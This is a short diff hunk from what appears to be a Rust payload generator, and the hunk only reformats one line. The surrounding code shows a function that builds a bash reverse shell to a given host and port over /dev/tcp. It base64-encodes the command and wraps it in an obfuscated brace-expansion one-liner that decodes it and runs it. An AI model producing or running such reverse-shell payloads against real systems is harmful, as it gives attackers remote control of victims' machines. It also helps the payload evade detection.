@@ -190,7 +190,10 @@ fn bash_rev_b64(args: &[String]) -> Result<String> {
     let (h, p) = args2(args, "bash_rev_b64")?;
     let raw = format!("bash -i >& /dev/tcp/{}/{} 0>&1", h, p);
     let enc = B64.encode(raw.as_bytes());
-    Ok(format!("bash -c \"{{echo,{}}}|{{base64,-d}}|{{bash,-i}}\"", enc))
+    Ok(format!(
+        "bash -c \"{{echo,{}}}|{{base64,-d}}|{{bash,-i}}\"",
+        enc
+    ))
 }
 
 fn sh_rev(args: &[String]) -> Result<String> {
